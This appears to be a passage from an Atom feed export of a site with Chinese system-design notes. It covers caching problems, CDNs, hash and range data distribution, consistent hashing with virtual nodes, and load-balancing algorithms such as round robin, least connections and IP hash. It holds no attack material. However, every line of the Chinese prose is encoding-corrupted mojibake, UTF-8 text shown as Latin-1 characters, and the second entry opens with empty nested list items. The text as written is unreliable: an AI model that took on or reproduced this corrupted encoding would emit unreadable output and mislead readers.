<p>ç›¸å¯¹äºæœ¬åœ°ç¼“å­˜æ¥è¯´ï¼Œåˆ†å¸ƒå¼ç¼“å­˜å•ç‹¬éƒ¨ç½²ï¼Œå¯ä»¥æ ¹æ®éœ€æ±‚åˆ†é…ç¡¬ä»¶èµ„æºã€‚ä¸ä»…å¦‚æ­¤ï¼ŒæœåŠ¡å™¨é›†ç¾¤éƒ½å¯ä»¥è®¿é—®åˆ†å¸ƒå¼ç¼“å­˜ï¼Œè€Œæœ¬åœ°ç¼“å­˜éœ€è¦åœ¨æœåŠ¡å™¨é›†ç¾¤ä¹‹é—´è¿›è¡ŒåŒæ­¥ï¼Œå®ç°éš¾åº¦å’Œæ€§èƒ½å¼€é”€ä¸Šéƒ½éå¸¸å¤§ã€‚</p>
<h2 id="æ•°æ®åº“ç¼“å­˜" tabindex="-1"> æ•°æ®åº“ç¼“å­˜</h2>
<p>MySQL ç­‰æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå…·æœ‰è‡ªå·±çš„æŸ¥è¯¢ç¼“å­˜æœºåˆ¶æ¥æé«˜æŸ¥è¯¢æ•ˆç‡ã€‚</p>
<h2 id="java-å†…éƒ¨çš„ç¼“å­˜" tabindex="-1"> Java å†…éƒ¨çš„ç¼“å­˜</h2>
<p>Java ä¸ºäº†ä¼˜åŒ–ç©ºé—´ï¼Œæé«˜å­—ç¬¦ä¸²ã€åŸºæœ¬æ•°æ®ç±»å‹åŒ…è£…ç±»çš„åˆ›å»ºæ•ˆç‡ï¼Œè®¾è®¡äº†å­—ç¬¦ä¸²å¸¸é‡æ± åŠ Byteã€Shortã€Characterã€Integerã€Longã€Boolean è¿™å…­ç§åŒ…è£…ç±»ç¼“å†²æ± ã€‚</p>
<h2 id="cpu-å¤šçº§ç¼“å­˜" tabindex="-1"> CPU å¤šçº§ç¼“å­˜</h2>
<p>CPU ä¸ºäº†è§£å†³è¿ç®—é€Ÿåº¦ä¸ä¸»å­˜ IO é€Ÿåº¦ä¸åŒ¹é…çš„é—®é¢˜ï¼Œå¼•å…¥äº†å¤šçº§ç¼“å­˜ç»“æ„ï¼ŒåŒæ—¶ä½¿ç”¨ MESI ç­‰ç¼“å­˜ä¸€è‡´æ€§åè®®æ¥è§£å†³å¤šæ ¸ CPU ç¼“å­˜æ•°æ®ä¸€è‡´æ€§çš„é—®é¢˜ã€‚</p>
<h1 id="å››ã€cdn" tabindex="-1"> å››ã€CDN</h1>
<p>å†…å®¹åˆ†å‘ç½‘ç»œï¼ˆContent distribution networkï¼ŒCDNï¼‰æ˜¯ä¸€ç§äº’è¿çš„ç½‘ç»œç³»ç»Ÿï¼Œå®ƒåˆ©ç”¨æ›´é è¿‘ç”¨æˆ·çš„æœåŠ¡å™¨ä»è€Œæ›´å¿«æ›´å¯é åœ°å°† HTMLã€CSSã€JavaScriptã€éŸ³ä¹ã€å›¾ç‰‡ã€è§†é¢‘ç­‰é™æ€èµ„æºåˆ†å‘ç»™ç”¨æˆ·ã€‚</p>
<p>CDN ä¸»è¦æœ‰ä»¥ä¸‹ä¼˜ç‚¹ï¼š</p>
<ul>
<li>æ›´å¿«åœ°å°†æ•°æ®åˆ†å‘ç»™ç”¨æˆ·ï¼›</li>
<li>é€šè¿‡éƒ¨ç½²å¤šå°æœåŠ¡å™¨ï¼Œä»è€Œæé«˜ç³»ç»Ÿæ•´ä½“çš„å¸¦å®½æ€§èƒ½ï¼›</li>
<li>å¤šå°æœåŠ¡å™¨å¯ä»¥çœ‹æˆæ˜¯ä¸€ç§å†—ä½™æœºåˆ¶ï¼Œä»è€Œå…·æœ‰é«˜å¯ç”¨æ€§ã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/15313ed8-a520-4799-a300-2b6b36be314f.jpg"/> </div><br>
<h1 id="äº”ã€ç¼“å­˜é—®é¢˜" tabindex="-1"> äº”ã€ç¼“å­˜é—®é¢˜</h1>
<h2 id="ç¼“å­˜ç©¿é€" tabindex="-1"> ç¼“å­˜ç©¿é€</h2>
<p>æŒ‡çš„æ˜¯å¯¹æŸä¸ªä¸€å®šä¸å­˜åœ¨çš„æ•°æ®è¿›è¡Œè¯·æ±‚ï¼Œè¯¥è¯·æ±‚å°†ä¼šç©¿é€ç¼“å­˜åˆ°è¾¾æ•°æ®åº“ã€‚</p>
<p>è§£å†³æ–¹æ¡ˆï¼š</p>
<ul>
<li>å¯¹è¿™äº›ä¸å­˜åœ¨çš„æ•°æ®ç¼“å­˜ä¸€ä¸ªç©ºæ•°æ®ï¼›</li>
<li>å¯¹è¿™ç±»è¯·æ±‚è¿›è¡Œè¿‡æ»¤ã€‚</li>
</ul>
<h2 id="ç¼“å­˜é›ªå´©" tabindex="-1"> ç¼“å­˜é›ªå´©</h2>
<p>æŒ‡çš„æ˜¯ç”±äºæ•°æ®æ²¡æœ‰è¢«åŠ è½½åˆ°ç¼“å­˜ä¸­ï¼Œæˆ–è€…ç¼“å­˜æ•°æ®åœ¨åŒä¸€æ—¶é—´å¤§é¢ç§¯å¤±æ•ˆï¼ˆè¿‡æœŸï¼‰ï¼Œåˆæˆ–è€…ç¼“å­˜æœåŠ¡å™¨å®•æœºï¼Œå¯¼è‡´å¤§é‡çš„è¯·æ±‚éƒ½åˆ°è¾¾æ•°æ®åº“ã€‚</p>
<p>åœ¨æœ‰ç¼“å­˜çš„ç³»ç»Ÿä¸­ï¼Œç³»ç»Ÿéå¸¸ä¾èµ–äºç¼“å­˜ï¼Œç¼“å­˜åˆ†æ‹…äº†å¾ˆå¤§ä¸€éƒ¨åˆ†çš„æ•°æ®è¯·æ±‚ã€‚å½“å‘ç”Ÿç¼“å­˜é›ªå´©æ—¶ï¼Œæ•°æ®åº“æ— æ³•å¤„ç†è¿™ä¹ˆå¤§çš„è¯·æ±‚ï¼Œå¯¼è‡´æ•°æ®åº“å´©æºƒã€‚</p>
<p>è§£å†³æ–¹æ¡ˆï¼š</p>
<ul>
<li>ä¸ºäº†é˜²æ­¢ç¼“å­˜åœ¨åŒä¸€æ—¶é—´å¤§é¢ç§¯è¿‡æœŸå¯¼è‡´çš„ç¼“å­˜é›ªå´©ï¼Œå¯ä»¥é€šè¿‡è§‚å¯Ÿç”¨æˆ·è¡Œä¸ºï¼Œåˆç†è®¾ç½®ç¼“å­˜è¿‡æœŸæ—¶é—´æ¥å®ç°ï¼›</li>
<li>ä¸ºäº†é˜²æ­¢ç¼“å­˜æœåŠ¡å™¨å®•æœºå‡ºç°çš„ç¼“å­˜é›ªå´©ï¼Œå¯ä»¥ä½¿ç”¨åˆ†å¸ƒå¼ç¼“å­˜ï¼Œåˆ†å¸ƒå¼ç¼“å­˜ä¸­æ¯ä¸€ä¸ªèŠ‚ç‚¹åªç¼“å­˜éƒ¨åˆ†çš„æ•°æ®ï¼Œå½“æŸä¸ªèŠ‚ç‚¹å®•æœºæ—¶å¯ä»¥ä¿è¯å…¶å®ƒèŠ‚ç‚¹çš„ç¼“å­˜ä»ç„¶å¯ç”¨ã€‚</li>
<li>ä¹Ÿå¯ä»¥è¿›è¡Œç¼“å­˜é¢„çƒ­ï¼Œé¿å…åœ¨ç³»ç»Ÿåˆšå¯åŠ¨ä¸ä¹…ç”±äºè¿˜æœªå°†å¤§é‡æ•°æ®è¿›è¡Œç¼“å­˜è€Œå¯¼è‡´ç¼“å­˜é›ªå´©ã€‚</li>
</ul>
<h2 id="ç¼“å­˜ä¸€è‡´æ€§" tabindex="-1"> ç¼“å­˜ä¸€è‡´æ€§</h2>
<p>ç¼“å­˜ä¸€è‡´æ€§è¦æ±‚æ•°æ®æ›´æ–°çš„åŒæ—¶ç¼“å­˜æ•°æ®ä¹Ÿèƒ½å¤Ÿå®æ—¶æ›´æ–°ã€‚</p>
<p>è§£å†³æ–¹æ¡ˆï¼š</p>
<ul>
<li>åœ¨æ•°æ®æ›´æ–°çš„åŒæ—¶ç«‹å³å»æ›´æ–°ç¼“å­˜ï¼›</li>
<li>åœ¨è¯»ç¼“å­˜ä¹‹å‰å…ˆåˆ¤æ–­ç¼“å­˜æ˜¯å¦æ˜¯æœ€æ–°çš„ï¼Œå¦‚æœä¸æ˜¯æœ€æ–°çš„å…ˆè¿›è¡Œæ›´æ–°ã€‚</li>
</ul>
<p>è¦ä¿è¯ç¼“å­˜ä¸€è‡´æ€§éœ€è¦ä»˜å‡ºå¾ˆå¤§çš„ä»£ä»·ï¼Œç¼“å­˜æ•°æ®æœ€å¥½æ˜¯é‚£äº›å¯¹ä¸€è‡´æ€§è¦æ±‚ä¸é«˜çš„æ•°æ®ï¼Œå…è®¸ç¼“å­˜æ•°æ®å­˜åœ¨ä¸€äº›è„æ•°æ®ã€‚</p>
<h2 id="ç¼“å­˜-æ— åº•æ´-ç°è±¡" tabindex="-1"> ç¼“å­˜ â€œæ— åº•æ´â€ ç°è±¡</h2>
<p>æŒ‡çš„æ˜¯ä¸ºäº†æ»¡è¶³ä¸šåŠ¡è¦æ±‚æ·»åŠ äº†å¤§é‡ç¼“å­˜èŠ‚ç‚¹ï¼Œä½†æ˜¯æ€§èƒ½ä¸ä½†æ²¡æœ‰å¥½è½¬åè€Œä¸‹é™äº†çš„ç°è±¡ã€‚</p>
<p>äº§ç”ŸåŸå› ï¼šç¼“å­˜ç³»ç»Ÿé€šå¸¸é‡‡ç”¨ hash å‡½æ•°å°† key æ˜ å°„åˆ°å¯¹åº”çš„ç¼“å­˜èŠ‚ç‚¹ï¼Œéšç€ç¼“å­˜èŠ‚ç‚¹æ•°ç›®çš„å¢åŠ ï¼Œé”®å€¼åˆ†å¸ƒåˆ°æ›´å¤šçš„èŠ‚ç‚¹ä¸Šï¼Œå¯¼è‡´å®¢æˆ·ç«¯ä¸€æ¬¡æ‰¹é‡æ“ä½œä¼šæ¶‰åŠå¤šæ¬¡ç½‘ç»œæ“ä½œï¼Œè¿™æ„å‘³ç€æ‰¹é‡æ“ä½œçš„è€—æ—¶ä¼šéšç€èŠ‚ç‚¹æ•°ç›®çš„å¢åŠ è€Œä¸æ–­å¢å¤§ã€‚æ­¤å¤–ï¼Œç½‘ç»œè¿æ¥æ•°å˜å¤šï¼Œå¯¹èŠ‚ç‚¹çš„æ€§èƒ½ä¹Ÿæœ‰ä¸€å®šå½±å“ã€‚</p>
<p>è§£å†³æ–¹æ¡ˆï¼š</p>
<ul>
<li>ä¼˜åŒ–æ‰¹é‡æ•°æ®æ“ä½œå‘½ä»¤ï¼›</li>
<li>å‡å°‘ç½‘ç»œé€šä¿¡æ¬¡æ•°ï¼›</li>
<li>é™ä½æ¥å…¥æˆæœ¬ï¼Œä½¿ç”¨é•¿è¿æ¥ / è¿æ¥æ± ï¼ŒNIO ç­‰ã€‚</li>
</ul>
<h1 id="å…­ã€æ•°æ®åˆ†å¸ƒ" tabindex="-1"> å…­ã€æ•°æ®åˆ†å¸ƒ</h1>
<h2 id="å“ˆå¸Œåˆ†å¸ƒ" tabindex="-1"> å“ˆå¸Œåˆ†å¸ƒ</h2>
<p>å“ˆå¸Œåˆ†å¸ƒå°±æ˜¯å°†æ•°æ®è®¡ç®—å“ˆå¸Œå€¼ä¹‹åï¼ŒæŒ‰ç…§å“ˆå¸Œå€¼åˆ†é…åˆ°ä¸åŒçš„èŠ‚ç‚¹ä¸Šã€‚ä¾‹å¦‚æœ‰ N ä¸ªèŠ‚ç‚¹ï¼Œæ•°æ®çš„ä¸»é”®ä¸º keyï¼Œåˆ™å°†è¯¥æ•°æ®åˆ†é…çš„èŠ‚ç‚¹åºå·ä¸ºï¼šhash(key)%Nã€‚</p>
<p>ä¼ ç»Ÿçš„å“ˆå¸Œåˆ†å¸ƒç®—æ³•å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼šå½“èŠ‚ç‚¹æ•°é‡å˜åŒ–æ—¶ï¼Œä¹Ÿå°±æ˜¯ N å€¼å˜åŒ–ï¼Œé‚£ä¹ˆå‡ ä¹æ‰€æœ‰çš„æ•°æ®éƒ½éœ€è¦é‡æ–°åˆ†å¸ƒï¼Œå°†å¯¼è‡´å¤§é‡çš„æ•°æ®è¿ç§»ã€‚</p>
<h2 id="é¡ºåºåˆ†å¸ƒ" tabindex="-1"> é¡ºåºåˆ†å¸ƒ</h2>
<p>å°†æ•°æ®åˆ’åˆ†ä¸ºå¤šä¸ªè¿ç»­çš„éƒ¨åˆ†ï¼ŒæŒ‰æ•°æ®çš„ ID æˆ–è€…æ—¶é—´åˆ†å¸ƒåˆ°ä¸åŒèŠ‚ç‚¹ä¸Šã€‚ä¾‹å¦‚ User è¡¨çš„ ID èŒƒå›´ä¸º 1 ~ 7000ï¼Œä½¿ç”¨é¡ºåºåˆ†å¸ƒå¯ä»¥å°†å…¶åˆ’åˆ†æˆå¤šä¸ªå­è¡¨ï¼Œå¯¹åº”çš„ä¸»é”®èŒƒå›´ä¸º 1 ~ 1000ï¼Œ1001 ~ 2000ï¼Œ...ï¼Œ6001 ~ 7000ã€‚</p>
<p>é¡ºåºåˆ†å¸ƒç›¸æ¯”äºå“ˆå¸Œåˆ†å¸ƒçš„ä¸»è¦ä¼˜ç‚¹å¦‚ä¸‹ï¼š</p>
<ul>
<li>èƒ½ä¿æŒæ•°æ®åŸæœ‰çš„é¡ºåºï¼›</li>
<li>å¹¶ä¸”èƒ½å¤Ÿå‡†ç¡®æ§åˆ¶æ¯å°æœåŠ¡å™¨å­˜å‚¨çš„æ•°æ®é‡ï¼Œä»è€Œä½¿å¾—å­˜å‚¨ç©ºé—´çš„åˆ©ç”¨ç‡æœ€å¤§ã€‚</li>
</ul>
<h1 id="ä¸ƒã€ä¸€è‡´æ€§å“ˆå¸Œ" tabindex="-1"> ä¸ƒã€ä¸€è‡´æ€§å“ˆå¸Œ</h1>
<p>Distributed Hash Tableï¼ˆDHTï¼‰ æ˜¯ä¸€ç§å“ˆå¸Œåˆ†å¸ƒæ–¹å¼ï¼Œå…¶ç›®çš„æ˜¯ä¸ºäº†å…‹æœä¼ ç»Ÿå“ˆå¸Œåˆ†å¸ƒåœ¨æœåŠ¡å™¨èŠ‚ç‚¹æ•°é‡å˜åŒ–æ—¶å¤§é‡æ•°æ®è¿ç§»çš„é—®é¢˜ã€‚</p>
<h2 id="åŸºæœ¬åŸç†" tabindex="-1"> åŸºæœ¬åŸç†</h2>
<p>å°†å“ˆå¸Œç©ºé—´ [0, 2<sup>n</sup>-1] çœ‹æˆä¸€ä¸ªå“ˆå¸Œç¯ï¼Œæ¯ä¸ªæœåŠ¡å™¨èŠ‚ç‚¹éƒ½é…ç½®åˆ°å“ˆå¸Œç¯ä¸Šã€‚æ¯ä¸ªæ•°æ®å¯¹è±¡é€šè¿‡å“ˆå¸Œå–æ¨¡å¾—åˆ°å“ˆå¸Œå€¼ä¹‹åï¼Œå­˜æ”¾åˆ°å“ˆå¸Œç¯ä¸­é¡ºæ—¶é’ˆæ–¹å‘ç¬¬ä¸€ä¸ªå¤§äºç­‰äºè¯¥å“ˆå¸Œå€¼çš„èŠ‚ç‚¹ä¸Šã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/68b110b9-76c6-4ee2-b541-4145e65adb3e.jpg"/> </div><br>
<p>ä¸€è‡´æ€§å“ˆå¸Œåœ¨å¢åŠ æˆ–è€…åˆ é™¤èŠ‚ç‚¹æ—¶åªä¼šå½±å“åˆ°å“ˆå¸Œç¯ä¸­ç›¸é‚»çš„èŠ‚ç‚¹ï¼Œä¾‹å¦‚ä¸‹å›¾ä¸­æ–°å¢èŠ‚ç‚¹ Xï¼Œåªéœ€è¦å°†å®ƒå‰ä¸€ä¸ªèŠ‚ç‚¹ C ä¸Šçš„æ•°æ®é‡æ–°è¿›è¡Œåˆ†å¸ƒå³å¯ï¼Œå¯¹äºèŠ‚ç‚¹ Aã€Bã€D éƒ½æ²¡æœ‰å½±å“ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/66402828-fb2b-418f-83f6-82153491bcfe.jpg"/> </div><br>
<h2 id="è™šæ‹ŸèŠ‚ç‚¹" tabindex="-1"> è™šæ‹ŸèŠ‚ç‚¹</h2>
<p>ä¸Šé¢æè¿°çš„ä¸€è‡´æ€§å“ˆå¸Œå­˜åœ¨æ•°æ®åˆ†å¸ƒä¸å‡åŒ€çš„é—®é¢˜ï¼ŒèŠ‚ç‚¹å­˜å‚¨çš„æ•°æ®é‡æœ‰å¯èƒ½ä¼šå­˜åœ¨å¾ˆå¤§çš„ä¸åŒã€‚</p>
<p>æ•°æ®ä¸å‡åŒ€ä¸»è¦æ˜¯å› ä¸ºèŠ‚ç‚¹åœ¨å“ˆå¸Œç¯ä¸Šåˆ†å¸ƒçš„ä¸å‡åŒ€ï¼Œè¿™ç§æƒ…å†µåœ¨èŠ‚ç‚¹æ•°é‡å¾ˆå°‘çš„æƒ…å†µä¸‹å°¤å…¶æ˜æ˜¾ã€‚</p>
<p>è§£å†³æ–¹å¼æ˜¯é€šè¿‡å¢åŠ è™šæ‹ŸèŠ‚ç‚¹ï¼Œç„¶åå°†è™šæ‹ŸèŠ‚ç‚¹æ˜ å°„åˆ°çœŸå®èŠ‚ç‚¹ä¸Šã€‚è™šæ‹ŸèŠ‚ç‚¹çš„æ•°é‡æ¯”çœŸå®èŠ‚ç‚¹æ¥å¾—å¤šï¼Œé‚£ä¹ˆè™šæ‹ŸèŠ‚ç‚¹åœ¨å“ˆå¸Œç¯ä¸Šåˆ†å¸ƒçš„å‡åŒ€æ€§å°±ä¼šæ¯”åŸæ¥çš„çœŸå®èŠ‚ç‚¹å¥½ï¼Œä»è€Œä½¿å¾—æ•°æ®åˆ†å¸ƒä¹Ÿæ›´åŠ å‡åŒ€ã€‚</p>
<h1 id="å‚è€ƒèµ„æ–™" tabindex="-1"> å‚è€ƒèµ„æ–™</h1>
<ul>
<li>å¤§è§„æ¨¡åˆ†å¸ƒå¼å­˜å‚¨ç³»ç»Ÿ</li>
<li><a href="https://tech.meituan.com/cache_about.html" target="_blank" rel="noopener noreferrer">ç¼“å­˜é‚£äº›äº‹</a></li>
<li><a href="https://my.oschina.net/jayhu/blog/732849" target="_blank" rel="noopener noreferrer">ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E5%85%A7%E5%AE%B9%E5%82%B3%E9%81%9E%E7%B6%B2%E8%B7%AF" target="_blank" rel="noopener noreferrer">å†…å®¹åˆ†å‘ç½‘ç»œ</a></li>
<li><a href="https://www.aspirationhosting.com/aspiration-cdn/" target="_blank" rel="noopener noreferrer">How Aspiration CDN helps to improve your website loading speed?</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">ä¸€ã€è´Ÿè½½å‡è¡¡</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E9%9B%86%E7%BE%A4.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1/%E9%9B%86%E7%BE%A4.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>

<h1 id="ä¸€ã€è´Ÿè½½å‡è¡¡" tabindex="-1"> ä¸€ã€è´Ÿè½½å‡è¡¡</h1>
<p>é›†ç¾¤ä¸­çš„åº”ç”¨æœåŠ¡å™¨ï¼ˆèŠ‚ç‚¹ï¼‰é€šå¸¸è¢«è®¾è®¡æˆæ— çŠ¶æ€ï¼Œç”¨æˆ·å¯ä»¥è¯·æ±‚ä»»ä½•ä¸€ä¸ªèŠ‚ç‚¹ã€‚</p>
<p>è´Ÿè½½å‡è¡¡å™¨ä¼šæ ¹æ®é›†ç¾¤ä¸­æ¯ä¸ªèŠ‚ç‚¹çš„è´Ÿè½½æƒ…å†µï¼Œå°†ç”¨æˆ·è¯·æ±‚è½¬å‘åˆ°åˆé€‚çš„èŠ‚ç‚¹ä¸Šã€‚</p>
<p>è´Ÿè½½å‡è¡¡å™¨å¯ä»¥ç”¨æ¥å®ç°é«˜å¯ç”¨ä»¥åŠä¼¸ç¼©æ€§ï¼š</p>
<ul>
<li>é«˜å¯ç”¨ï¼šå½“æŸä¸ªèŠ‚ç‚¹æ•…éšœæ—¶ï¼Œè´Ÿè½½å‡è¡¡å™¨ä¼šå°†ç”¨æˆ·è¯·æ±‚è½¬å‘åˆ°å¦å¤–çš„èŠ‚ç‚¹ä¸Šï¼Œä»è€Œä¿è¯æ‰€æœ‰æœåŠ¡æŒç»­å¯ç”¨ï¼›</li>
<li>ä¼¸ç¼©æ€§ï¼šæ ¹æ®ç³»ç»Ÿæ•´ä½“è´Ÿè½½æƒ…å†µï¼Œå¯ä»¥å¾ˆå®¹æ˜“åœ°æ·»åŠ æˆ–ç§»é™¤èŠ‚ç‚¹ã€‚</li>
</ul>
<p>è´Ÿè½½å‡è¡¡å™¨è¿è¡Œè¿‡ç¨‹åŒ…å«ä¸¤ä¸ªéƒ¨åˆ†ï¼š</p>
<ol>
<li>æ ¹æ®è´Ÿè½½å‡è¡¡ç®—æ³•å¾—åˆ°è½¬å‘çš„èŠ‚ç‚¹ï¼›</li>
<li>è¿›è¡Œè½¬å‘ã€‚</li>
</ol>
<h2 id="è´Ÿè½½å‡è¡¡ç®—æ³•" tabindex="-1"> è´Ÿè½½å‡è¡¡ç®—æ³•</h2>
<h3 id="_1-è½®è¯¢-round-robin" tabindex="-1"> 1. è½®è¯¢ï¼ˆRound Robinï¼‰</h3>
<p>è½®è¯¢ç®—æ³•æŠŠæ¯ä¸ªè¯·æ±‚è½®æµå‘é€åˆ°æ¯ä¸ªæœåŠ¡å™¨ä¸Šã€‚</p>
<p>ä¸‹å›¾ä¸­ï¼Œä¸€å…±æœ‰ 6 ä¸ªå®¢æˆ·ç«¯äº§ç”Ÿäº† 6 ä¸ªè¯·æ±‚ï¼Œè¿™ 6 ä¸ªè¯·æ±‚æŒ‰ (1, 2, 3, 4, 5, 6) çš„é¡ºåºå‘é€ã€‚(1, 3, 5) çš„è¯·æ±‚ä¼šè¢«å‘é€åˆ°æœåŠ¡å™¨ 1ï¼Œ(2, 4, 6) çš„è¯·æ±‚ä¼šè¢«å‘é€åˆ°æœåŠ¡å™¨ 2ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/9daa3616-00a4-48c4-9146-792dc8499be3.jpg" width="500px"/> </div><br>
<p>è¯¥ç®—æ³•æ¯”è¾ƒé€‚åˆæ¯ä¸ªæœåŠ¡å™¨çš„æ€§èƒ½å·®ä¸å¤šçš„åœºæ™¯ï¼Œå¦‚æœæœ‰æ€§èƒ½å­˜åœ¨å·®å¼‚çš„æƒ…å†µä¸‹ï¼Œé‚£ä¹ˆæ€§èƒ½è¾ƒå·®çš„æœåŠ¡å™¨å¯èƒ½æ— æ³•æ‰¿æ‹…è¿‡å¤§çš„è´Ÿè½½ï¼ˆä¸‹å›¾çš„ Server 2ï¼‰ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/bfea8772-d01b-4a51-8adc-edfd7d3dce84.jpg" width="500px"/> </div><br>
<h3 id="_2-åŠ æƒè½®è¯¢-weighted-round-robbin" tabindex="-1"> 2. åŠ æƒè½®è¯¢ï¼ˆWeighted Round Robbinï¼‰</h3>
<p>åŠ æƒè½®è¯¢æ˜¯åœ¨è½®è¯¢çš„åŸºç¡€ä¸Šï¼Œæ ¹æ®æœåŠ¡å™¨çš„æ€§èƒ½å·®å¼‚ï¼Œä¸ºæœåŠ¡å™¨èµ‹äºˆä¸€å®šçš„æƒå€¼ï¼Œæ€§èƒ½é«˜çš„æœåŠ¡å™¨åˆ†é…æ›´é«˜çš„æƒå€¼ã€‚</p>
<p>ä¾‹å¦‚ä¸‹å›¾ä¸­ï¼ŒæœåŠ¡å™¨ 1 è¢«èµ‹äºˆçš„æƒå€¼ä¸º 5ï¼ŒæœåŠ¡å™¨ 2 è¢«èµ‹äºˆçš„æƒå€¼ä¸º 1ï¼Œé‚£ä¹ˆ (1, 2, 3, 4, 5) è¯·æ±‚ä¼šè¢«å‘é€åˆ°æœåŠ¡å™¨ 1ï¼Œ(6) è¯·æ±‚ä¼šè¢«å‘é€åˆ°æœåŠ¡å™¨ 2ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/4ab87717-e264-4232-825d-8aaf08f14e8b.jpg" width="500px"/> </div><br>
<h3 id="_3-æœ€å°‘è¿æ¥-least-connections" tabindex="-1"> 3. æœ€å°‘è¿æ¥ï¼ˆleast Connectionsï¼‰</h3>
<p>ç”±äºæ¯ä¸ªè¯·æ±‚çš„è¿æ¥æ—¶é—´ä¸ä¸€æ ·ï¼Œä½¿ç”¨è½®è¯¢æˆ–è€…åŠ æƒè½®è¯¢ç®—æ³•çš„è¯ï¼Œå¯èƒ½ä¼šè®©ä¸€å°æœåŠ¡å™¨å½“å‰è¿æ¥æ•°è¿‡å¤§ï¼Œè€Œå¦ä¸€å°æœåŠ¡å™¨çš„è¿æ¥è¿‡å°ï¼Œé€ æˆè´Ÿè½½ä¸å‡è¡¡ã€‚</p>
<p>ä¾‹å¦‚ä¸‹å›¾ä¸­ï¼Œ(1, 3, 5) è¯·æ±‚ä¼šè¢«å‘é€åˆ°æœåŠ¡å™¨ 1ï¼Œä½†æ˜¯ (1, 3) å¾ˆå¿«å°±æ–­å¼€è¿æ¥ï¼Œæ­¤æ—¶åªæœ‰ (5) è¯·æ±‚è¿æ¥æœåŠ¡å™¨ 1ï¼›(2, 4, 6) è¯·æ±‚è¢«å‘é€åˆ°æœåŠ¡å™¨ 2ï¼Œåªæœ‰ (2) çš„è¿æ¥æ–­å¼€ï¼Œæ­¤æ—¶ (6, 4) è¯·æ±‚è¿æ¥æœåŠ¡å™¨ 2ã€‚è¯¥ç³»ç»Ÿç»§ç»­è¿è¡Œæ—¶ï¼ŒæœåŠ¡å™¨ 2 ä¼šæ‰¿æ‹…è¿‡å¤§çš„è´Ÿè½½ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/e98deb5a-d5d4-4294-aa9b-9220d4483403.jpg" width="500px"/> </div><br>
<p>æœ€å°‘è¿æ¥ç®—æ³•å°±æ˜¯å°†è¯·æ±‚å‘é€ç»™å½“å‰æœ€å°‘è¿æ¥æ•°çš„æœåŠ¡å™¨ä¸Šã€‚</p>
<p>ä¾‹å¦‚ä¸‹å›¾ä¸­ï¼ŒæœåŠ¡å™¨ 1 å½“å‰è¿æ¥æ•°æœ€å°ï¼Œé‚£ä¹ˆæ–°åˆ°æ¥çš„è¯·æ±‚ 6 å°±ä¼šè¢«å‘é€åˆ°æœåŠ¡å™¨ 1 ä¸Šã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/43d323ac-9f07-4e4a-a315-4eaf8c38766c.jpg" width="500px"/> </div><br>
<h3 id="_4-åŠ æƒæœ€å°‘è¿æ¥-weighted-least-connection" tabindex="-1"> 4. åŠ æƒæœ€å°‘è¿æ¥ï¼ˆWeighted Least Connectionï¼‰</h3>
<p>åœ¨æœ€å°‘è¿æ¥çš„åŸºç¡€ä¸Šï¼Œæ ¹æ®æœåŠ¡å™¨çš„æ€§èƒ½ä¸ºæ¯å°æœåŠ¡å™¨åˆ†é…æƒé‡ï¼Œå†æ ¹æ®æƒé‡è®¡ç®—å‡ºæ¯å°æœåŠ¡å™¨èƒ½å¤„ç†çš„è¿æ¥æ•°ã€‚</p>
<h3 id="_5-éšæœºç®—æ³•-random" tabindex="-1"> 5. éšæœºç®—æ³•ï¼ˆRandomï¼‰</h3>
<p>æŠŠè¯·æ±‚éšæœºå‘é€åˆ°æœåŠ¡å™¨ä¸Šã€‚</p>
<p>å’Œè½®è¯¢ç®—æ³•ç±»ä¼¼ï¼Œè¯¥ç®—æ³•æ¯”è¾ƒé€‚åˆæœåŠ¡å™¨æ€§èƒ½å·®ä¸å¤šçš„åœºæ™¯ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a42ad3a7-3574-4c48-a783-ed3d08a0688a.jpg" width="500px"/> </div><br>
<h3 id="_6-æºåœ°å€å“ˆå¸Œæ³•-ip-hash" tabindex="-1"> 6. æºåœ°å€å“ˆå¸Œæ³• (IP Hash)</h3>
<p>æºåœ°å€å“ˆå¸Œé€šè¿‡å¯¹å®¢æˆ·ç«¯ IP è®¡ç®—å“ˆå¸Œå€¼ä¹‹åï¼Œå†å¯¹æœåŠ¡å™¨æ•°é‡å–æ¨¡å¾—åˆ°ç›®æ ‡æœåŠ¡å™¨çš„åºå·ã€‚</p>
<p>å¯ä»¥ä¿è¯åŒä¸€ IP çš„å®¢æˆ·ç«¯çš„è¯·æ±‚ä¼šè½¬å‘åˆ°åŒä¸€å°æœåŠ¡å™¨ä¸Šï¼Œç”¨æ¥å®ç°ä¼šè¯ç²˜æ»ï¼ˆSticky Sessionï¼‰</p>
